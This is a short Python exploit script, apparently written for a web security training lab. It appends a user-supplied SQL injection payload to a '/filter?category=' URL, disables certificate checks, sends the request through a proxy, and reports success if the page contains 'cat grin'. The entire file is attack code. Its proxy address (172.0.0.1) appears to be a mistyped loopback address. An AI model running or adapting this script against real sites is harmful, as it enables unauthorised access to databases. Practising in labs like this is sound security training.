# give this script url+"payload" then it tell you found sql or not
import sys
import requests
import urllib3

# Disable warnings for unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define proxies (if needed)
proxies = {'http': 'http://172.0.0.1:8080', 'https': 'https://172.0.0.1:8080'}

def exploit_sqli(url, payload):
    uri = '/filter?category='
    try:
        r = requests.get(url + uri + payload, verify=False, proxies=proxies)
        r.raise_for_status()  # Raise an error for bad responses
    except requests.RequestException as e:
        print(f"[-] Request failed: {e}")
        return False

    # Check for the specific string in the response
    if "cat grin" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s http://www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url, payload):
        print("[+] SQL injection is successful!")
    else:
        print("[+] SQL injection is unsuccessful!")
